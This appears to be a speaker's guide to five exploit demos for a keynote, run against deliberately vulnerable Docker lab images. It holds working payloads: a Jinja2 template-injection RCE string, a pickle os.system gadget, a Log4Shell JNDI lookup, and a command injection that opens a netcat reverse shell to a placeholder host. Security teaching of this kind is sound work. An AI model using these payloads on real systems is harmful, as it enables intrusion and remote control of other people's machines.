# Keynote demos: five shell-popping exploits (Docker, no VM)

Five hands-on exploits, each a different way developers get betrayed by something
they trust, each ending in a shell inside a container. No VM, no eBPF.

## Which one gels with your keynote

**Run the malicious npm package demo live.** It is the tightest fit, because your
keynote already has the slopsquatting beat (Beat 3). That beat makes the abstract
claim "your AI suggests a package, you install it." This demo is the live payoff:
"you install it, and it installs you." `npm install` opens a shell before your own
code ever runs. Same theme, same beat, nothing extra to explain. Then you show the
one-line fix (`npm install --ignore-scripts`) and the room exhales.

**Keep Flask SSTI as the safe alternative.** If you want the most reliable,
most visually elegant single-container reveal (`{{7*7}}` prints `49`, then a shell),
use SSTI. It is rock-solid and needs one public image.

**Pre-record Log4Shell or Struts/Equifax** as the marquee clip for narrative weight,
and run one of the single-container demos live.

If you have time for two live: pair the npm demo (supply-chain betrayal) with SSTI
(web-input betrayal). That is the spine of your whole talk in two minutes.

## The ranked list

| # | Demo | The trust it betrays | Setup | Reliability | Why for this talk |
| --- | --- | --- | --- | --- | --- |
| 1 | Malicious npm package | The install step itself | Trivial (bundled) | High | Pays off the slopsquatting beat live. |
| 2 | Flask SSTI | User input rendered as template code | Trivial (1 image) | Very high | Elegant reveal: `{{7*7}}` = `49`, then a shell. |
| 3 | Python pickle | Deserializing saved data | Trivial (bundled) | Very high | "No sandbox. Deserializing is executing." |
| 4 | Log4Shell | A trusted logging dependency | Moderate (2 parts) | Medium | The famous one. Dependency as weapon. |
| 5 | DVWA command injection | Unsanitized input reaching a shell | Trivial (1 image) | Very high | The fundamental. Every input is a door. |

---

### 1. Malicious npm package (supply chain)

A developer installs a tiny, innocent-looking helper, and `npm install` itself opens
a shell. The victim's code never runs. The trick is a `postinstall` hook in
`package.json`. This is how the real 2026 axios compromise and the paperclip2 /
ethers-provider2 packages worked.

```bash
cd shell-demos/npm-supplychain
nc -lvnp 4444                      # terminal 1: your listener
docker compose run --rm victim     # terminal 2: an ordinary install
```

The whole payload:
```json
"scripts": { "postinstall": "node postinstall.js" }
```

Fix to show on stage: `npm install --ignore-scripts`.

### 2. Flask SSTI (template injection)

User input is rendered by Jinja2, so the input becomes server-side code.

```bash
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
# browse http://localhost:8089
```

- Prove it evaluates: `{{7*7}}` returns `49`.
- Prove RCE: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
- Catch a shell: start `nc -lvnp 4444`, inject an `os.popen`/`os.system` reverse-shell
  one-liner (generate at revshells.com).

Keep the `popen('id')` step as your guaranteed-visible proof.

### 3. Python pickle deserialization

The server calls `pickle.loads()` on data you send, and that call runs your code.

```bash
cd shell-demos/pickle-rce
nc -lvnp 4444
docker compose up --build -d
LISTENER_HOST=host.docker.internal python3 make_payload.py   # prints base64
curl -s -X POST http://localhost:5000/load -d "data=PASTE_BASE64"
```

The entire exploit:
```python
class RCE:
    def __reduce__(self):
        return (os.system, (CMD,))
```

The line that lands: there is no safe mode, deserializing untrusted data is running
it. Sets up the ML-model-file supply-chain angle (poisoned `.pkl` / `.pt`).

### 4. Log4Shell (CVE-2021-44228)

A single string in a login field gets logged, and the logging library fetches and
runs attacker code. The most famous dependency-as-weapon story in a decade.

```bash
# vulnerable app
docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
# plus a malicious LDAP+HTTP server (kozmer/log4j-shell-poc) pointing at your listener
```

Payload sent as the username:
```text
${jndi:ldap://YOUR_HOST:1389/a}
```

Most moving parts of the five (app + LDAP + HTTP + a JDK to compile the payload).
Pre-record it rather than running it live.

### 5. DVWA OS command injection

A form runs `ping` on the server and concatenates your input into the shell command.

```bash
docker run -d -p 8080:80 vulnerables/web-dvwa
# log in (admin/password), set DVWA Security to Low, open Command Injection
```

```text
127.0.0.1; id
127.0.0.1; nc -e /bin/sh YOUR_HOST 4444
```

The cleanest "every input is a door." Good for walking the Low-to-High security
levels into your closing "ask three questions" beat.

---

## Swap-ins

- **Struts / Equifax (CVE-2017-5638):** one crafted `Content-Type` header runs
  commands as root. Image: `piesecurity/apache-struts2-cve-2017-5638`, or via Vulhub.
  Swap for Log4Shell if you prefer the breach story.
- **Vulhub:** `github.com/vulhub/vulhub`, 300+ dockerized CVEs, `docker compose up -d`.
  Shop here for a different CVE.

## Safety

- Intentionally vulnerable targets. Run only in a disposable VM or isolated host,
  never exposed to a real network. Several Vulhub containers give real unauthenticated
  RCE.
- All reverse shells connect back to a listener you start. Say that on stage.
- Record a fallback capture of whatever you run live. If it stalls more than ~15
  seconds, cut to the recording and keep narrating.
